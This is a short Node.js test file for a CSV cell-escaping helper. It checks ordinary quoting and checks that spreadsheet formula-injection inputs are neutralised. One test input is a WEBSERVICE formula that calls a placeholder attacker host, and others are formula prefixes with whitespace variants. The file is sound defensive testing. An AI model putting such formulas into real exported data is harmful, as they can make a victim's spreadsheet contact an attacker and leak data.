import assert from "node:assert/strict";
import test from "node:test";
import { csvCell } from "../app/lib/csv.ts";

test("CSV cells keep ordinary reviewer data intact", () => {
  assert.equal(csvCell("Albany County"), '"Albany County"');
  assert.equal(csvCell(["one", "two"]), '"one|two"');
  assert.equal(csvCell('A "quoted" value'), '"A ""quoted"" value"');
});

test("CSV cells neutralize spreadsheet formulas and whitespace variants", () => {
  for (const value of ["=WEBSERVICE(\"https://attacker.invalid\")", "+1+1", "-2+3", "@SUM(1,1)", "  =1+1", "\t=1+1", "\r=1+1"]) {
    assert.equal(csvCell(value).startsWith('"\''), true, value);
  }
});

